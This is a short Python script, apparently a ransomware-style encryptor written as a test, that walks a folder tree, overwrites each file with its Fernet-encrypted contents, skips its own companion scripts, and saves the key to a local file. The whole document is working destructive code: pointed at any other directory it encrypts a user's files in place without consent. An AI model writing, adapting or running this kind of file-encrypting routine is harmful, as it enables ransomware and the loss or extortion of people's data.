import os
from cryptography.fernet import Fernet

root_dir = "C:\\Users/acer/Music/trail"
key = Fernet.generate_key()
wkaie = Fernet(key)

for dirpath, dirnames, filenames in os.walk(root_dir):
    for filename in filenames:
        full_path = os.path.join(dirpath, filename)
        if filename.endswith(".key") or filename == "wkaieEnc.py" or filename == "wkaieDec.py":
            continue
        with open(full_path, "rb") as f:
            unpackedFile = f.read()
            encData = wkaie.encrypt(unpackedFile)
            
        with open(full_path, "wb") as f:
            f.write(encData)
            
        with open("Thekey.key", "wb") as ThekeyFile:
            ThekeyFile.write(key)